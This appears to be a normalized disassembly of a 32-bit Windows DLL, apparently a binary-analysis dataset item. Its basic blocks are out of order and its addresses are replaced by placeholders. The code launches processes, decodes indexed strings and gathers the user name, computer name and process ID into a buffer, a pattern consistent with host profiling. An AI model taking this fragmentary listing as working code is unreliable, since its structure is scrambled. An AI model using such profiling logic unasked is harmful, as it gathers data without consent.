push [ esp + 0x84 ]
call j_sub_1003f3e3#2
add esp 0x4
mov [ esp + 0x740 ] 0x5
cmp [ esp + 0x98 ] 0x10
jb r-xdata
mov [ esp + 0x740 ] 0x3
cmp [ esp + 0x5c ] 0x8
jb r-xdata
sub_10012fb0
push ebp
mov ebp esp
push 0xffffffff
push sub_1004dbb0
mov eax [ fs : 0x0 ]
push eax
sub esp 0x98
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x10 ] eax
push esi
push edi
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov [ ebp - 0x38 ] edx
mov [ ebp - 0x34 ] ecx
mov esi [ ebp + 0xc ]
mov [ ebp - 0x30 ] esi
mov [ ebp - 0x4 ] 0x1
mov ecx 0x420
cmp [ ebp + 0x8 ] 0x0
mov eax 0x8000420
cmovne eax ecx
sub esp 0x18
mov ecx esp
mov [ ebp - 0x48 ] esp
mov [ ebp - 0x2c ] eax
xor eax eax
push 0xffffffff
mov [ ecx + 0x14 ] 0x7
mov [ ecx + 0x10 ] 0x0
push eax
mov [ ecx ] ax
lea eax [ ebp + 0x28 ]
push eax
call sub_10003a20
mov [ ebp - 0x4 ] 0x2
mov [ ebp - 0x4 ] 0x1
lea ecx [ ebp - 0x28 ]
call sub_10007be0
add esp 0x18
mov edi eax
mov [ ebp - 0x4 ] 0x3
lea eax [ ebp + 0x28 ]
cmp eax edi
je r-xdata
mov [ ebp - 0x4 ] 0x1
cmp [ ebp - 0x14 ] 0x8
jb r-xdata
cmp [ ebp + 0x3c ] 0x8
jb r-xdata
xor eax eax
mov [ ebp - 0x14 ] 0x7
push 0x44
push eax
mov [ ebp - 0x28 ] ax
lea eax [ ebp - 0xa0 ]
push eax
mov [ ebp - 0x18 ] 0x0
call sub_10045ec0
mov eax [ ebp - 0x34 ]
add esp 0xc
mov [ ebp - 0x64 ] eax
mov eax [ ebp - 0x38 ]
mov [ ebp - 0x60 ] eax
xor eax eax
mov [ ebp - 0xa0 ] 0x44
mov [ ebp - 0x74 ] 0x101
mov [ ebp - 0x68 ] 0xffffffff
mov [ ebp - 0x70 ] ax
cmp [ ebp + 0x8 ] eax
je r-xdata
push [ ebp - 0x28 ]
call j_sub_1003f3e3#2
add esp 0x4
xor eax eax
mov [ ebp + 0x3c ] 0x7
push edi
lea ecx [ ebp + 0x28 ]
mov [ ebp + 0x38 ] 0x0
mov [ ebp + 0x28 ] ax
call sub_10003980
push [ ebp + 0x28 ]
call j_sub_1003f3e3#2
add esp 0x4
cmp [ ebp + 0x20 ] 0x0
mov [ ebp - 0x3c ] 0x1
mov [ ebp - 0x40 ] 0x0
mov [ ebp - 0x44 ] 0xc
jbe r-xdata
mov eax 0x5
mov [ ebp - 0x70 ] ax
mov eax [ ebp + 0x38 ]
xor ecx ecx
add eax 0xac
mov edx 0x2
mul edx
xorps xmm0 xmm0
movdqu [ ebp - 0x58 ] xmm0
seto cl
neg ecx
or ecx eax
push ecx
call sub_1003c61a
add esp 0x4
lea ecx [ ebp + 0x28 ]
cmp [ ebp + 0x3c ] 0x8
mov esi eax
mov edx esi
cmovae ecx [ ebp + 0x28 ]
lea esp [ esp ]
cmp [ ebp + 0x24 ] 0x8
lea ecx [ ebp - 0x44 ]
push 0x0
push 0x0
push 0x3
push ecx
push 0x1
lea eax [ ebp + 0x10 ]
cmovae eax [ ebp + 0x10 ]
push 0x80000000
push eax
call [ CreateFileW@IAT ]
mov [ ebp - 0x68 ] eax
cmp eax 0xffffffff
jne r-xdata
movzx eax [ ecx ]
lea ecx [ ecx + 0x2 ]
mov [ edx ] ax
lea edx [ edx + 0x2 ]
test ax ax
jne r-xdata
lea eax [ ebp - 0x58 ]
push eax
lea eax [ ebp - 0xa0 ]
push eax
push 0x0
push 0x0
push [ ebp - 0x2c ]
push 0x1
push 0x0
push 0x0
push esi
push 0x0
call [ CreateProcessW@IAT ]
mov [ ebp - 0x2c ] eax
call [ GetLastError@IAT ]
push esi
mov edi eax
call j_sub_1003f3e3
mov ecx [ ebp - 0x68 ]
add esp 0x4
mov esi [ CloseHandle@IAT ]
cmp ecx 0xffffffff
je r-xdata
call [ GetLastError@IAT ]
mov [ esi ] eax
xor esi esi
jmp r-xdata
push [ ebp - 0x54 ]
call esi
cmp [ ebp - 0x2c ] 0x0
jne r-xdata
push ecx
call esi
mov [ ebp - 0x4 ] 0x0
cmp [ ebp + 0x24 ] 0x8
jb r-xdata
mov esi [ ebp - 0x58 ]
mov eax [ ebp - 0x30 ]
xor esi esi
mov [ eax ] edi
jmp r-xdata
xor eax eax
mov [ ebp + 0x24 ] 0x7
mov [ ebp + 0x20 ] 0x0
mov [ ebp + 0x10 ] ax
mov [ ebp - 0x4 ] 0xffffffff
cmp [ ebp + 0x3c ] 0x8
jb r-xdata
push [ ebp + 0x10 ]
call j_sub_1003f3e3#2
add esp 0x4
xor eax eax
mov [ ebp + 0x3c ] 0x7
mov [ ebp + 0x28 ] ax
mov eax esi
mov [ ebp + 0x38 ] 0x0
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
mov ecx [ ebp - 0x10 ]
xor ecx ebp
call sub_1003c623
mov esp ebp
pop ebp
retn
push [ ebp + 0x28 ]
call j_sub_1003f3e3#2
add esp 0x4
sub_10013280
push ebp
mov ebp esp
push 0xffffffff
push sub_1004dbf9
mov eax [ fs : 0x0 ]
push eax
push ecx
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov [ ebp - 0x10 ] 0x0
mov eax [ ebp + 0x8 ]
mov [ eax ] r--data
mov edx [ ecx + 0x48 ]
mov [ eax + 0x8 ] edx
mov ecx [ ecx + 0x4c ]
mov [ eax + 0xc ] ecx
mov [ ebp - 0x4 ] 0x0
mov [ ebp - 0x10 ] 0x1
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
mov esp ebp
pop ebp
retn 0x4
sub_100132e0
push ebp
mov ebp esp
and esp 0xfffffff8
push 0xffffffff
push sub_1004dd2b
mov eax [ fs : 0x0 ]
push eax
push ecx
mov eax 0x1a74
call sub_10048ab0
mov eax [ rw-data ]
xor eax esp
mov [ esp + 0x1a70 ] eax
push ebx
push esi
push edi
mov eax [ rw-data ]
xor eax esp
push eax
lea eax [ esp + 0x1a88 ]
mov [ fs : 0x0 ] eax
mov [ esp + 0x74 ] ecx
mov ebx [ ebp + 0x8 ]
mov [ esp + 0xcc ] 0x0
mov [ esp + 0xd0 ] 0x0
mov [ esp + 0x14 ] ebx
mov [ esp + 0xd0 ] 0xf
mov [ esp + 0xcc ] 0x0
mov [ esp + 0xbc ] 0x0
mov [ esp + 0x1a90 ] 0x0
cmp [ rw-data ] 0x0
mov edi [ InterlockedExchange@IAT ]
jne r-xdata
mov esi [ rw-data ]
cmp [ rw-data ] 0x0
jne r-xdata
mov ecx 0x33
call sub_100382c0
push eax
push rw-data
call edi
mov eax [ rw-data ]
cmp [ rw-data ] 0x0
mov [ esp + 0x28 ] eax
jne r-xdata
mov ecx 0x34
call sub_100382c0
push eax
push rw-data
call edi
mov eax [ rw-data ]
cmp [ rw-data ] 0x0
mov [ esp + 0x78 ] eax
jne r-xdata
mov ecx 0x35
call sub_100382c0
push eax
push rw-data
call edi
mov eax [ rw-data ]
cmp [ rw-data ] 0x0
mov [ esp + 0x6c ] eax
jne r-xdata
mov ecx 0x36
call sub_100382c0
push eax
push rw-data
call edi
mov eax [ rw-data ]
cmp [ rw-data ] 0x0
mov [ esp + 0x68 ] eax
jne r-xdata
mov ecx 0x37
call sub_100382c0
push eax
push rw-data
call edi
mov eax [ rw-data ]
cmp [ rw-data ] 0x0
mov [ esp + 0x70 ] eax
jne r-xdata
mov ecx 0x38
call sub_100382c0
push eax
push rw-data
call edi
mov eax [ rw-data ]
cmp [ rw-data ] 0x0
mov [ esp + 0x64 ] eax
jne r-xdata
mov ecx 0x39
call sub_100382c0
push eax
push rw-data
call edi
mov eax [ rw-data ]
cmp [ rw-data ] 0x0
mov [ esp + 0x2c ] eax
jne r-xdata
mov ecx 0x3a
call sub_100382c0
push eax
push rw-data
call edi
mov eax [ rw-data ]
cmp [ rw-data ] 0x0
mov [ esp + 0x34 ] eax
jne r-xdata
mov ecx 0x3b
call sub_100382c0
push eax
push rw-data
call edi
mov eax [ rw-data ]
cmp [ rw-data ] 0x0
mov [ esp + 0x38 ] eax
jne r-xdata
mov ecx 0x3c
call sub_100382c0
push eax
push rw-data
call edi
mov eax [ rw-data ]
cmp [ rw-data ] 0x0
mov [ esp + 0x30 ] eax
jne r-xdata
mov ecx 0x3d
call sub_100382c0
push eax
push rw-data
call edi
mov eax [ rw-data ]
cmp [ rw-data ] 0x0
mov [ esp + 0x3c ] eax
jne r-xdata
mov ecx 0x3e
call sub_100382c0
push eax
push rw-data
call edi
mov edi [ rw-data ]
mov ecx ebx
mov eax [ ebx ]
mov [ esp + 0x1c ] edi
call [ eax + 0x28 ]
cmp [ esi ] 0x0
mov ebx eax
mov [ esp + 0x18 ] ebx
jne r-xdata
mov ecx 0x14
call sub_100382c0
push eax
push rw-data
call edi
mov ecx esi
lea edx [ ecx + 0x1 ]
xor ecx ecx
jmp r-xdata
mov al [ ecx ]
inc ecx
test al al
jne r-xdata
sub ecx edx
push ecx
push esi
lea ecx [ esp + 0xc4 ]
call sub_10005470
call [ GetCommandLineW@IAT ]
sub esp 0x18
mov esi eax
mov edx esp
mov [ esp + 0x3c ] esp
xor eax eax
mov [ edx + 0x14 ] 0x7
mov [ edx + 0x10 ] 0x0
mov [ edx ] ax
cmp [ esi ] ax
jne r-xdata
mov ecx esi
lea ebx [ ecx + 0x2 ]
jmp r-xdata
xor ecx ecx
jmp r-xdata
mov ax [ ecx ]
add ecx 0x2
test ax ax
jne r-xdata
push ecx
push esi
mov ecx edx
call sub_10009730
mov [ esp + 0x1aa8 ] 0x1
mov [ esp + 0x1aa8 ] 0x0
lea ecx [ esp + 0x164 ]
call sub_1003c1b0
add esp 0x18
mov [ esp + 0x1a90 ] 0x2
lea ecx [ esp + 0xbc ]
push 0xffffffff
push 0x0
push eax
call sub_100050b0
mov [ esp + 0x1a90 ] 0x0
cmp [ esp + 0x160 ] 0x10
jb r-xdata
sub ecx ebx
mov ebx [ esp + 0x30 ]
sar ecx 0x1
cmp [ edi ] 0x0
mov [ esp + 0x160 ] 0xf
mov [ esp + 0x15c ] 0x0
mov [ esp + 0x14c ] 0x0
jne r-xdata
push [ esp + 0x14c ]
call j_sub_1003f3e3#2
add esp 0x4
mov ecx edi
lea edx [ ecx + 0x1 ]
xor ecx ecx
jmp r-xdata
mov al [ ecx ]
inc ecx
test al al
jne r-xdata
sub ecx edx
push ecx
push edi
lea ecx [ esp + 0xc4 ]
call sub_10005470
lea eax [ esp + 0xac ]
mov ecx ebx
push eax
call sub_10013280
mov esi eax
mov [ esp + 0x1a90 ] 0x3
lea ecx [ esp + 0x7c ]
call sub_1003ba00
mov [ esp + 0x1a90 ] 0x4
mov ecx [ eax + 0x8 ]
mov edx [ esi + 0x8 ]
sub ecx edx
mov eax [ eax + 0xc ]
mov esi [ esi + 0xc ]
sbb eax esi
push 0x0
push 0x3e8
push eax
push ecx
call sub_1004b160
push edx
push eax
push [ esp + 0x30 ]
lea eax [ esp + 0x1e8 ]
push eax
call sub_10014960
add esp 0x10
mov [ esp + 0x1a90 ] 0x3
mov [ esp + 0x7c ] r--data
mov [ esp + 0x1a90 ] 0x0
cmp [ esp + 0x1dc ] 0x0
mov [ esp + 0xac ] r--data
jne r-xdata
lea ecx [ esp + 0x1dc ]
lea edx [ ecx + 0x1 ]
xor ecx ecx
jmp r-xdata
mov al [ ecx ]
inc ecx
test al al
jne r-xdata
sub ecx edx
push ecx
lea eax [ esp + 0x1e0 ]
push eax
lea ecx [ esp + 0xc4 ]
call sub_10005470
cmp [ edi ] 0x0
jne r-xdata
mov ecx edi
lea edx [ ecx + 0x1 ]
lea ecx [ ecx ]
xor ecx ecx
jmp r-xdata
mov al [ ecx ]
inc ecx
test al al
jne r-xdata
sub ecx edx
push ecx
push edi
lea ecx [ esp + 0xc4 ]
call sub_10005470
mov ecx [ esp + 0x14 ]
lea edx [ esp + 0x8c ]
push edx
mov eax [ ecx ]
call [ eax + 0x24 ]
mov esi eax
mov [ esp + 0x1a90 ] 0x5
lea ecx [ esp + 0x9c ]
call sub_1003ba00
mov [ esp + 0x1a90 ] 0x6
mov ecx [ eax + 0x8 ]
mov edx [ esi + 0x8 ]
sub ecx edx
mov eax [ eax + 0xc ]
mov esi [ esi + 0xc ]
sbb eax esi
push 0x0
push 0x3e8
push eax
push ecx
call sub_1004b160
push edx
push eax
push [ esp + 0x80 ]
lea eax [ esp + 0x1e8 ]
push eax
call sub_10014960
add esp 0x10
mov [ esp + 0x1a90 ] 0x5
mov [ esp + 0x9c ] r--data
mov [ esp + 0x1a90 ] 0x0
cmp [ esp + 0x1dc ] 0x0
mov [ esp + 0x8c ] r--data
jne r-xdata
lea ecx [ esp + 0x1dc ]
lea edx [ ecx + 0x1 ]
jmp r-xdata
xor ecx ecx
jmp r-xdata
mov al [ ecx ]
inc ecx
test al al
jne r-xdata
push ecx
lea eax [ esp + 0x1e0 ]
push eax
lea ecx [ esp + 0xc4 ]
call sub_10005470
cmp [ edi ] 0x0
jne r-xdata
sub ecx edx
mov ecx edi
lea edx [ ecx + 0x1 ]
lea esp [ esp ]
xor ecx ecx
jmp r-xdata
mov al [ ecx ]
inc ecx
test al al
jne r-xdata
sub ecx edx
push ecx
push edi
lea ecx [ esp + 0xc4 ]
call sub_10005470
call [ GetCurrentProcessId@IAT ]
push eax
push [ esp + 0x70 ]
lea eax [ esp + 0x1e4 ]
push eax
call sub_10014960
add esp 0xc
cmp [ esp + 0x1dc ] 0x0
jne r-xdata
lea ecx [ esp + 0x1dc ]
lea edx [ ecx + 0x1 ]
lea ebx [ ebx ]
xor ecx ecx
jmp r-xdata
mov al [ ecx ]
inc ecx
test al al
jne r-xdata
sub ecx edx
push ecx
lea eax [ esp + 0x1e0 ]
push eax
lea ecx [ esp + 0xc4 ]
call sub_10005470
cmp [ edi ] 0x0
jne r-xdata
mov ecx edi
lea edx [ ecx + 0x1 ]
lea esp [ esp ]
xor ecx ecx
jmp r-xdata
mov al [ ecx ]
inc ecx
test al al
jne r-xdata
sub ecx edx
push ecx
push edi
lea ecx [ esp + 0xc4 ]
call sub_10005470
mov ecx [ ebx + 0x8 ]
mov esi [ ebx + 0xc ]
mov eax [ ecx + 0x24 ]
sub eax [ ecx + 0x20 ]
sar eax 0x2
cmp esi eax
jae r-xdata
xor esi esi
mov eax [ ecx + 0x20 ]
mov esi [ eax + esi * 4 ]
jmp r-xdata
mov esi [ esp + 0x18 ]
mov eax [ esi + 0x8 ]
push [ eax + 0x54 ]
lea eax [ esp + 0x1e0 ]
push [ esp + 0x74 ]
push eax
call sub_10014960
add esp 0xc
cmp [ esp + 0x1dc ] 0x0
jne r-xdata
mov ebx [ esp + 0x68 ]
cmp [ ebx ] 0x0
jne r-xdata
test esi esi
je r-xdata
lea ecx [ esp + 0x1dc ]
lea edx [ ecx + 0x1 ]
lea ecx [ ecx ]
xor ecx ecx
jmp r-xdata
mov ecx ebx
lea edx [ ecx + 0x1 ]
mov edi edi
xor ecx ecx
jmp r-xdata
mov al [ ecx ]
inc ecx
test al al
jne r-xdata
sub ecx edx
push ecx
lea eax [ esp + 0x1e0 ]
push eax
lea ecx [ esp + 0xc4 ]
call sub_10005470
cmp [ edi ] 0x0
jne r-xdata
mov al [ ecx ]
inc ecx
test al al
jne r-xdata
sub ecx edx
push ecx
push ebx
lea ecx [ esp + 0xc4 ]
call sub_10005470
mov eax [ esi ]
lea ecx [ esp + 0x11c ]
push ecx
mov ecx esi
call [ eax + 0xc ]
mov [ esp + 0x1a90 ] 0x7
lea ecx [ esp + 0xbc ]
push 0xffffffff
push 0x0
push eax
call sub_100050b0
mov [ esp + 0x1a90 ] 0x0
cmp [ esp + 0x130 ] 0x10
jb r-xdata
mov ecx edi
lea edx [ ecx + 0x1 ]
lea esp [ esp ]
xor ecx ecx
jmp r-xdata
cmp [ edi ] 0x0
mov [ esp + 0x130 ] 0xf
mov [ esp + 0x12c ] 0x0
mov [ esp + 0x11c ] 0x0
jne r-xdata
push [ esp + 0x11c ]
call j_sub_1003f3e3#2
add esp 0x4
mov al [ ecx ]
inc ecx
test al al
jne r-xdata
sub ecx edx
push ecx
push edi
lea ecx [ esp + 0xc4 ]
call sub_10005470
mov eax [ esi + 0x34 ]
sub eax [ esi + 0x30 ]
sar eax 0x3
push eax
push [ esp + 0x68 ]
lea eax [ esp + 0x1e4 ]
push eax
call sub_10014960
add esp 0xc
cmp [ esp + 0x1dc ] 0x0
jne r-xdata
mov ecx edi
lea edx [ ecx + 0x1 ]
lea esp [ esp ]
xor ecx ecx
jmp r-xdata
lea ecx [ esp + 0x1dc ]
lea edx [ ecx + 0x1 ]
lea ecx [ ecx ]
xor ecx ecx
jmp r-xdata
mov al [ ecx ]
inc ecx
test al al
jne r-xdata
sub ecx edx
push ecx
push edi
lea ecx [ esp + 0xc4 ]
call sub_10005470
mov al [ ecx ]
inc ecx
test al al
jne r-xdata
sub ecx edx
push ecx
lea eax [ esp + 0x1e0 ]
push eax
lea ecx [ esp + 0xc4 ]
call sub_10005470
cmp [ edi ] 0x0
jne r-xdata
mov ecx edi
lea edx [ ecx + 0x1 ]
lea esp [ esp ]
xor ecx ecx
jmp r-xdata
mov al [ ecx ]
inc ecx
test al al
jne r-xdata
sub ecx edx
push ecx
push edi
lea ecx [ esp + 0xc4 ]
call sub_10005470
mov eax [ esi + 0x34 ]
xor ebx ebx
sub eax [ esi + 0x30 ]
sar eax 0x3
test eax eax
je r-xdata
lea eax [ esp + 0x20 ]
mov [ esp + 0x20 ] 0x1191
push eax
lea eax [ esp + 0x8e8 ]
push eax
call [ GetUserNameW@IAT ]
test eax eax
je r-xdata
lea ebx [ ebx ]
mov esi [ GetComputerNameExW@IAT ]
lea eax [ esp + 0x20 ]
push eax
lea eax [ esp + 0x8e8 ]
mov [ esp + 0x24 ] 0x1191
push eax
push 0x1
call esi
test eax eax
je r-xdata
mov ebx [ esp + 0x3c ]
cmp [ ebx ] 0x0
jne r-xdata
lea ecx [ esp + 0x1dc ]
lea edx [ ecx + 0x1 ]
xor ecx ecx
jmp r-xdata
lea eax [ esp + 0x20 ]
mov [ esp + 0x20 ] 0x1191
push eax
lea eax [ esp + 0x8e8 ]
push eax
push 0x0
call esi
test eax eax
je r-xdata
mov ebx [ esp + 0x38 ]
cmp [ ebx ] 0x0
jne r-xdata
mov ecx ebx
lea edx [ ecx + 0x1 ]
xor ecx ecx
jmp r-xdata
mov al [ ecx ]
inc ecx
test al al
jne r-xdata
sub ecx edx
push ecx
lea eax [ esp + 0x1e0 ]
push eax
lea ecx [ esp + 0xc4 ]
call sub_10005470
mov esi [ esp + 0x18 ]
lea edx [ esp + 0x1ac ]
push edx
mov eax [ esi + 0x30 ]
mov ecx [ eax + ebx * 8 + 0x4 ]
mov eax [ ecx ]
call [ eax + 0xc ]
mov [ esp + 0x1a90 ] 0x9
lea ecx [ esp + 0xbc ]
push 0xffffffff
push 0x0
push eax
call sub_100050b0
mov [ esp + 0x1a90 ] 0x8
cmp [ esp + 0x1c0 ] 0x10
jb r-xdata
mov ebx [ esp + 0x34 ]
cmp [ ebx ] 0x0
jne r-xdata
mov ebx [ esp + 0x30 ]
cmp [ ebx ] 0x0
jne r-xdata
mov ecx ebx
lea edx [ ecx + 0x1 ]
xor ecx ecx
jmp r-xdata
mov al [ ecx ]
inc ecx
test al al
jne r-xdata
sub ecx edx
push ecx
push ebx
lea ecx [ esp + 0xc4 ]
call sub_10005470
sub esp 0x18
xor eax eax
mov edx esp
mov [ esp + 0x3c ] esp
mov [ edx + 0x14 ] 0x7
mov [ edx + 0x10 ] 0x0
mov [ edx ] ax
cmp [ esp + 0x8fc ] ax
jne r-xdata
mov edi [ esp + 0x1c ]
mov [ esp + 0x1c0 ] 0xf
mov [ esp + 0x1bc ] 0x0
mov [ esp + 0x1ac ] 0x0
cmp [ edi ] 0x0
jne r-xdata
push [ esp + 0x1ac ]
call j_sub_1003f3e3#2
add esp 0x4
mov ecx ebx
lea edx [ ecx + 0x1 ]
lea ecx [ ecx ]
xor ecx ecx
jmp r-xdata
mov ecx ebx
lea edx [ ecx + 0x1 ]
mov edi edi
xor ecx ecx
jmp r-xdata
mov al [ ecx ]
inc ecx
test al al
jne r-xdata
sub ecx edx
push ecx
push ebx
lea ecx [ esp + 0xc4 ]
call sub_10005470
sub esp 0x18
xor eax eax
mov edx esp
mov [ esp + 0x3c ] esp
mov [ edx + 0x14 ] 0x7
mov [ edx + 0x10 ] 0x0
mov [ edx ] ax
cmp [ esp + 0x8fc ] ax
jne r-xdata
lea ecx [ esp + 0x8fc ]
lea esi [ ecx + 0x2 ]
nop
xor ecx ecx
jmp r-xdata
mov ecx edi
lea edx [ ecx + 0x1 ]
xor ecx ecx
jmp r-xdata
mov al [ ecx ]
inc ecx
test al al
jne r-xdata
sub ecx edx
push ecx
push ebx
lea ecx [ esp + 0xc4 ]
call sub_10005470
cmp [ edi ] 0x0
jne r-xdata
mov al [ ecx ]
inc ecx
test al al
jne r-xdata
sub ecx edx
push ecx
push ebx
lea ecx [ esp + 0xc4 ]
call sub_10005470
sub esp 0x18
xor eax eax
mov edx esp
mov [ esp + 0x3c ] esp
mov [ edx + 0x14 ] 0x7
mov [ edx + 0x10 ] 0x0
mov [ edx ] ax
cmp [ esp + 0x8fc ] ax
jne r-xdata
lea ecx [ esp + 0x8fc ]
lea ebx [ ecx + 0x2 ]
nop
xor ecx ecx
jmp r-xdata
mov ax [ ecx ]
add ecx 0x2
test ax ax
jne r-xdata
sub ecx esi
sar ecx 0x1
push ecx
lea eax [ esp + 0x900 ]
mov ecx edx
push eax
call sub_10009730
mov [ esp + 0x1aa8 ] 0xa
mov [ esp + 0x1aa8 ] 0x0
lea ecx [ esp + 0x194 ]
call sub_1003c1b0
add esp 0x18
mov [ esp + 0x1a90 ] 0xb
lea ecx [ esp + 0xbc ]
push 0xffffffff
push 0x0
push eax
call sub_100050b0
mov [ esp + 0x1a90 ] 0x0
cmp [ esp + 0x190 ] 0x10
jb r-xdata
mov al [ ecx ]
inc ecx
test al al
jne r-xdata
sub ecx edx
push ecx
push edi
lea ecx [ esp + 0xc4 ]
call sub_10005470
mov [ esp + 0x1a90 ] 0x0
cmp [ esp + 0x118 ] 0x10
jb r-xdata
mov ecx edi
lea edx [ ecx + 0x1 ]
xor ecx ecx
jmp r-xdata
lea ecx [ esp + 0x8fc ]
lea esi [ ecx + 0x2 ]
jmp r-xdata
xor ecx ecx
jmp r-xdata
mov ax [ ecx ]
add ecx 0x2
test ax ax
jne r-xdata
sub ecx ebx
sar ecx 0x1
push ecx
lea eax [ esp + 0x900 ]
mov ecx edx
push eax
call sub_10009730
mov [ esp + 0x1aa8 ] 0xc
mov [ esp + 0x1aa8 ] 0x0
lea ecx [ esp + 0x1dc ]
call sub_1003c1b0
add esp 0x18
mov [ esp + 0x1a90 ] 0xd
lea ecx [ esp + 0xbc ]
push 0xffffffff
push 0x0
push eax
call sub_100050b0
mov [ esp + 0x1a90 ] 0x0
cmp [ esp + 0x1d8 ] 0x10
jb r-xdata
cmp [ edi ] 0x0
mov [ esp + 0x190 ] 0xf
mov [ esp + 0x18c ] 0x0
mov [ esp + 0x17c ] 0x0
jne r-xdata
push [ esp + 0x17c ]
call j_sub_1003f3e3#2
add esp 0x4
mov eax [ esi + 0x34 ]
inc ebx
sub eax [ esi + 0x30 ]
sar eax 0x3
mov [ esp + 0x118 ] 0xf
mov [ esp + 0x114 ] 0x0
mov [ esp + 0x104 ] 0x0
cmp ebx eax
jb r-xdata
push [ esp + 0x104 ]
call j_sub_1003f3e3#2
add esp 0x4
mov al [ ecx ]
inc ecx
test al al
jne r-xdata
sub ecx edx
push ecx
push edi
lea ecx [ esp + 0xc4 ]
call sub_10005470
lea ecx [ esp + 0x40 ]
call sub_1002d010
mov [ esp + 0x1a90 ] 0x10
mov ebx [ esp + 0x44 ]
mov eax [ esp + 0x40 ]
mov [ esp + 0x28 ] ebx
cmp eax ebx
je r-xdata
mov ax [ ecx ]
add ecx 0x2
test ax ax
jne r-xdata
push ecx
lea eax [ esp + 0x900 ]
mov ecx edx
push eax
call sub_10009730
mov [ esp + 0x1aa8 ] 0xe
mov [ esp + 0x1aa8 ] 0x0
lea ecx [ esp + 0x14c ]
call sub_1003c1b0
add esp 0x18
mov [ esp + 0x1a90 ] 0xf
lea ecx [ esp + 0xbc ]
push 0xffffffff
push 0x0
push eax
call sub_100050b0
mov [ esp + 0x1a90 ] 0x0
cmp [ esp + 0x148 ] 0x10
jb r-xdata
cmp [ edi ] 0x0
mov [ esp + 0x1d8 ] 0xf
mov [ esp + 0x1d4 ] 0x0
mov [ esp + 0x1c4 ] 0x0
jne r-xdata
push [ esp + 0x1c4 ]
call j_sub_1003f3e3#2
add esp 0x4
mov ecx edi
lea edx [ ecx + 0x1 ]
xor ecx ecx
jmp r-xdata
mov eax [ esi + 0x30 ]
mov ecx [ eax + ebx * 8 ]
mov eax [ ecx ]
call [ eax ]
mov edi eax
lea eax [ esp + 0x104 ]
push eax
mov ecx edi
mov edx [ edi ]
call [ edx + 0x8 ]
mov [ esp + 0x1a90 ] 0x8
lea esi [ esp + 0x104 ]
cmp [ esp + 0x118 ] 0x10
mov ecx edi
mov eax [ edi ]
cmovae esi [ esp + 0x104 ]
call [ eax + 0x20 ]
push eax
mov eax [ edi ]
mov ecx edi
push esi
call [ eax + 0x4 ]
push eax
push [ esp + 0x38 ]
lea eax [ esp + 0x1ec ]
push eax
call sub_10014960
add esp 0x14
cmp [ esp + 0x1dc ] 0x0
jne r-xdata
push 0x94
call sub_1003cdeb
mov esi eax
add esp 0x4
mov [ esp + 0x24 ] esi
mov [ esp + 0x1a90 ] 0x16
test esi esi
je r-xdata
add eax 0x54
mov [ esp + 0x14 ] eax
jmp r-xdata
sub ecx esi
sar ecx 0x1
cmp [ edi ] 0x0
mov [ esp + 0x148 ] 0xf
mov [ esp + 0x144 ] 0x0
mov [ esp + 0x134 ] 0x0
jne r-xdata
push [ esp + 0x134 ]
call j_sub_1003f3e3#2
add esp 0x4
mov ecx edi
lea edx [ ecx + 0x1 ]
xor ecx ecx
jmp r-xdata
mov al [ ecx ]
inc ecx
test al al
jne r-xdata
sub ecx edx
push ecx
push edi
lea ecx [ esp + 0xc4 ]
call sub_10005470
xor esi esi
mov eax [ esp + 0x74 ]
mov ecx [ eax - 0x10 ]
add eax 0xfffffff0
mov ecx [ ecx + 0x8 ]
add ecx eax
push ecx
mov eax [ ecx ]
mov eax [ eax + 0x4 ]
call eax
push edx
push eax
mov ecx esi
call sub_10018c90
mov esi eax
jmp r-xdata
cmp [ rw-data ] 0x0
jne r-xdata
mov ecx edi
lea edx [ ecx + 0x1 ]
xor ecx ecx
jmp r-xdata
mov al [ ecx ]
inc ecx
test al al
jne r-xdata
sub ecx edx
push ecx
push edi
lea ecx [ esp + 0xc4 ]
call sub_10005470
mov [ esp + 0x1a90 ] 0x10
cmp [ esp + 0x60 ] 0x10
jb r-xdata
push 0xffffffff
push 0x0
push eax
call sub_100018b0
mov [ esp + 0x1a90 ] 0x10
lea eax [ esp + 0xbc ]
push 0xffffffff
push 0x0
mov [ esp + 0x64 ] 0x0
lea ecx [ esp + 0x54 ]
mov [ esp + 0x68 ] 0x0
push eax
mov [ esp + 0x6c ] 0xf
mov [ esp + 0x68 ] 0x0
mov [ esp + 0x58 ] 0x0
call sub_100018b0
mov [ esp + 0x1a90 ] 0x17
lea ecx [ esi + 0x34 ]
lea eax [ esp + 0x4c ]
cmp ecx eax
je r-xdata
mov esi [ rw-data ]
cmp [ rw-data ] 0x0
jne r-xdata
mov ecx 0x3f
call sub_100382c0
push eax
push rw-data
call [ InterlockedExchange@IAT ]
mov al [ ecx ]
inc ecx
test al al
jne r-xdata
sub ecx edx
push ecx
push edi
lea ecx [ esp + 0xc4 ]
call sub_10005470
mov [ esp + 0x60 ] 0xf
mov [ esp + 0x5c ] 0x0
mov [ esp + 0x4c ] 0x0
test esi esi
jne r-xdata
push [ esp + 0x4c ]
call j_sub_1003f3e3#2
add esp 0x4
mov eax [ rw-data ]
cmp [ rw-data ] 0x0
mov [ esp + 0x38 ] eax
jne r-xdata
mov ecx 0x40
call sub_100382c0
push eax
push rw-data
call [ InterlockedExchange@IAT ]
mov eax [ esi ]
mov ebx [ eax + 0x8 ]
add ebx esi
xor ebx ebx
jmp r-xdata
mov eax [ rw-data ]
cmp [ rw-data ] 0x0
mov [ esp + 0x3c ] eax
jne r-xdata
mov ecx 0x41
call sub_100382c0
push eax
push rw-data
call [ InterlockedExchange@IAT ]
mov [ esp + 0x1a90 ] 0xffffffff
cmp [ esp + 0xd0 ] 0x10
jb r-xdata
mov edi [ esp + 0x44 ]
cmp esi edi
je r-xdata
mov [ esp + 0x1a90 ] 0x0
mov esi [ esp + 0x40 ]
test esi esi
je r-xdata
mov eax [ rw-data ]
cmp [ rw-data ] 0x0
mov [ esp + 0x2c ] eax
jne r-xdata
mov ecx 0x42
call sub_100382c0
push eax
push rw-data
call [ InterlockedExchange@IAT ]
mov [ esp + 0xd0 ] 0xf
mov eax ebx
mov [ esp + 0xcc ] 0x0
mov [ esp + 0xbc ] 0x0
mov ecx [ esp + 0x1a88 ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov ecx [ esp + 0x1a70 ]
xor ecx esp
call sub_1003c623
